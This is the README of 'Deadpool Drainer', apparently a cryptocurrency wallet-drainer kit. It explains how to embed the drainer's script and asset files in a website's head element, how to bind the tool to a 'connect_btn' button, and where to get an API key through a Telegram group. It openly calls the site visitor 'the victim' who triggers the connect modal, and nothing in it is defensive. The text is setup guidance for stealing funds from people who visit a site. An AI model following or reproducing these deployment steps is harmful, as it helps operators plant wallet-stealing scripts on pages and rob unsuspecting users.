## ⚔️ DEADPOOL DRAINER 

#### How to add DEADPOOL DRAINER TO YOUR FRONTEND

This folder contains the drainer files and demo `index.html` file.

The drainer files are in the `assets` folder. This folder must be present in your website.

```html 
<script src="./settings.js"></script>
<script type="module" crossorigin src="/assets/index-ByX2dVtE.js"></script>
<link rel="stylesheet" crossorigin href="/assets/index-DUESqOEi.css"/>
```

Make sure these files are linked and should be placed in the head element. `settings.js` file and two other files in the `assets`. These files are very important.

The `settings.js` should already contain your `API_KEY` if it doesn't check your telegram group or call the `/compile` command to regenerate.

To add the connect feature to a button on your website add id of `connect_btn` to your own connect button. for example: 

```html 
<button id="connect_btn">Connect</button>
```

When the victim clicks on this button it will show a connect modal.